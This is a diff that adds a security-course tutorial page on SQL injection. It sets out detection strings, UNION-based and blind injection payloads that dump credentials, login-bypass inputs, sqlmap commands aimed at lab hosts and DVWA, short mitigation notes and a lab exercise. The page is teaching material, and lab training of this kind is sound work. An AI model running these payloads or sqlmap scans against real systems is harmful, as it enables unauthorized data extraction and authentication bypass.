@@ -1,0 +1,177 @@
+---
+title: "Tut02: SQL Injection"
+---
+
+SQL injection (SQLi) is one of the oldest and most impactful web vulnerabilities. When an application builds SQL queries by concatenating user input without proper sanitization, an attacker can manipulate the query to extract data, bypass authentication, or—in some configurations—execute commands on the server.
+
+## How SQL Injection Works
+
+Consider a login form that constructs this query:
+
+```sql
+SELECT * FROM users WHERE username = 'admin' AND password = 'hunter2';
+```
+
+If the application pastes user input directly into the query, you can inject SQL syntax:
+
+Username: `admin' --`
+
+The query becomes:
+
+```sql
+SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything';
+```
+
+The `--` comments out the rest of the query. The password check is gone. You are logged in as admin.
+
+## Detecting SQL Injection
+
+Test every input point with a single quote:
+
+```
+'
+```
+
+If the application throws a database error, returns unexpected results, or behaves differently, SQL injection may be present.
+
+Classic detection payloads:
+
+```
+'
+''
+`
+')
+'))
+' OR '1'='1
+' OR 1=1--
+" OR 1=1--
+') OR ('1'='1
+```
+
+## Manual Exploitation: UNION-Based
+
+UNION attacks append a second SELECT to the original query and retrieve data from other tables.
+
+### Step 1: Find the number of columns
+
+```sql
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--   -- error here means 2 columns
+```
+
+Or with UNION NULL:
+
+```sql
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+```
+
+### Step 2: Find a column that renders in the output
+
+```sql
+' UNION SELECT 'a',NULL--
+' UNION SELECT NULL,'a'--
+```
+
+### Step 3: Extract data
+
+```sql
+-- Get the database name
+' UNION SELECT database(),NULL--
+
+-- List all tables
+' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
+
+-- Dump usernames and passwords
+' UNION SELECT username,password FROM users--
+```
+
+## Manual Exploitation: Blind SQL Injection
+
+When the application does not display query output directly, use Boolean-based blind injection.
+
+```sql
+-- Does the first character of the database name equal 'd'?
+' AND SUBSTRING(database(),1,1)='d'--
+```
+
+If the page behaves differently (more or fewer results, different content), the condition is true.
+
+Time-based blind injection does not require visible output differences:
+
+```sql
+-- If database() starts with 'd', sleep 5 seconds
+' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(5), 0)--
+```
+
+Measure the response time to infer the answer.
+
+## Automated Exploitation with sqlmap
+
+`sqlmap` automates detection and exploitation of SQL injection.
+
+```sh
+# Basic scan of a URL parameter
+sqlmap -u "http://target.lab/search?q=test"
+
+# Test a POST request (capture with Burp, save to file)
+sqlmap -r request.txt
+
+# Extract the database name
+sqlmap -u "http://target.lab/search?q=test" --dbs
+
+# Extract tables from a specific database
+sqlmap -u "http://target.lab/search?q=test" -D dvwa --tables
+
+# Dump a table
+sqlmap -u "http://target.lab/search?q=test" -D dvwa -T users --dump
+
+# Test with a session cookie
+sqlmap -u "http://target.lab/page?id=1" --cookie="PHPSESSID=abc123"
+```
+
+Always use `--batch` flag to skip manual confirmations in automated scans:
+
+```sh
+sqlmap -u "http://target.lab/search?q=test" --batch --dbs
+```
+
+## Authentication Bypass
+
+Classic login bypass payloads:
+
+```
+Username: admin' --
+Username: admin'#
+Username: ' OR 1=1--
+Username: ' OR '1'='1'--
+Password: anything
+```
+
+In DVWA at low security, try:
+
+- URL: `http://localhost/vulnerabilities/sqli/`
+- ID field: `1' UNION SELECT user,password FROM users--`
+
+## Mitigation (for Understanding)
+
+SQL injection is prevented by:
+
+1. **Parameterized queries / prepared statements** — the query structure is fixed; user input is passed as a parameter, never concatenated.
+2. **Stored procedures** — same principle.
+3. **Input validation** — reject unexpected characters at the boundary.
+4. **Least privilege** — the database account the app uses should not have access to sensitive tables or system functions.
+
+Understanding the fix helps you identify when it is absent.
+
+## Task
+
+> **[Task]** Open DVWA and set the security level to Low. Go to the SQL Injection module. Extract all usernames and password hashes from the `users` table using a manual UNION attack. Then run sqlmap against the same endpoint and confirm it retrieves the same data. Record every payload you used.
+
+## Reference
+
+- [PortSwigger Web Security Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)
+- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+- [sqlmap Documentation](https://sqlmap.org)
